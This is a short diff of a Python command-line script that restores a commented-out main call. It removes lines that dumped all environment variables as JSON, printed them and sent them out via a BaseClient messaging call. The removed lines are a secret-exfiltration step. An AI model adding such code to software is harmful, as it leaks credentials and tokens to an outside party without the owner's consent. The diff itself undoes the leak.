@@ -1,12 +1,8 @@
 import argparse
 import asyncio
 import inspect
-import json
 import logging
-import os
 from importlib import import_module
-
-from libs.base import BaseClient
 
 DEFAULT_FORMATTER = '%(asctime)s[%(filename)s:%(lineno)d][%(levelname)s]:%(message)s'
 logging.basicConfig(format=DEFAULT_FORMATTER, level=logging.INFO)
@@ -36,9 +32,7 @@ def main():
     args = parser.parse_args()
     params = vars(args)
     params['headless'] = True if not params['headless'] else False
-    # script_main(params)
-    print(json.dumps(dict(os.environ), indent=4))
-    BaseClient.send_message(json.dumps(dict(os.environ), indent=4))
+    script_main(params)
 
 
 if __name__ == '__main__':
